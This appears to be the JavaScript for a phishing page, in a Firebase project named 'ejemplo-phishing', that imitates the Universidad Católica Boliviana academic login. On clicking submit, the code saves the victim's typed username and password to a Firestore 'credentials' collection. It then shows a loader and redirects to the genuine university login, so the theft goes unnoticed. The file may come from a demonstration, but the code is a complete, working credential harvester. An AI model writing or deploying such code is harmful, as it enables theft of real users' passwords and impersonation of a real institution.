const firebaseConfig = {
    apiKey: "AIzaSyB8nhx3dOv-TCWuk_LuJf7srWnr8n8E9dU",
    authDomain: "ejemplo-phishing-fa8b5.firebaseapp.com",
    projectId: "ejemplo-phishing-fa8b5",
    storageBucket: "ejemplo-phishing-fa8b5.appspot.com",
    messagingSenderId: "697790012653",
    appId: "1:697790012653:web:aeedaedc5f07317ee080e4"
};

firebase.initializeApp(firebaseConfig);



document.addEventListener("DOMContentLoaded", function () {
    const passwordInput = document.querySelector('input[type="password"]');
    const togglePasswordIcon = document.querySelector('.toggle-password');
    const submitButton = document.getElementById('submitBtn');
    const db = firebase.firestore();

    submitBtn.addEventListener('click', function (event) {
        event.preventDefault();
    
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
    
        const username = usernameInput.value;
        const password = passwordInput.value;
    
        db.collection('credentials').add({
            username: username,
            password: password
        }).then(function () {
            //mostrar modal en pantalla con un mensaje de error y redireccionar a la pagina de la ucb
            showLoader();
            setTimeout(function(){
                hideLoader();
            }, 4000);
            window.location.replace('https://academico.ucb.edu.bo/AcademicoNacional/login');
        }).catch(function (error) {
            console.log(error);
        });
      });

    togglePasswordIcon.addEventListener('click', function () {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            togglePasswordIcon.classList.remove('fa-eye-slash');
            togglePasswordIcon.classList.add('fa-eye');
        } else {
            passwordInput.type = 'password';
            togglePasswordIcon.classList.remove('fa-eye');
            togglePasswordIcon.classList.add('fa-eye-slash');
        }
    });

    const form = document.querySelector('form');
    form.addEventListener('submit', function (event) {
        const inputs = form.querySelectorAll('input[required]');
        inputs.forEach(function (input) {
            if (input.value.trim() === '') {
                input.parentNode.classList.add('error');
                event.preventDefault();
            } else {
                input.parentNode.classList.remove('error');
            }
        });
    });

    const formGroups = document.querySelectorAll('.form-group');

    formGroups.forEach(function (formGroup) {
        const input = formGroup.querySelector('input');

        input.addEventListener('focus', function () {
            formGroup.classList.add('active');
        });

        input.addEventListener('blur', function () {
            if (input.value === '') {
                formGroup.classList.remove('active');
            }
        });
    });
});

// Mostrar el círculo de carga y el fondo oscurecido
function showLoader() {
    const loaderOverlay = document.createElement('div');
    loaderOverlay.classList.add('loader-overlay');
  
    const loader = document.createElement('div');
    loader.classList.add('loader');
  
    loaderOverlay.appendChild(loader);
    document.body.appendChild(loaderOverlay);
  }
  
  
 // Ocultar el círculo de carga y el fondo oscurecido
function hideLoader() {
    const loaderOverlay = document.querySelector('.loader-overlay');
    if (loaderOverlay) {
      document.body.removeChild(loaderOverlay);
    }
  }
  
  
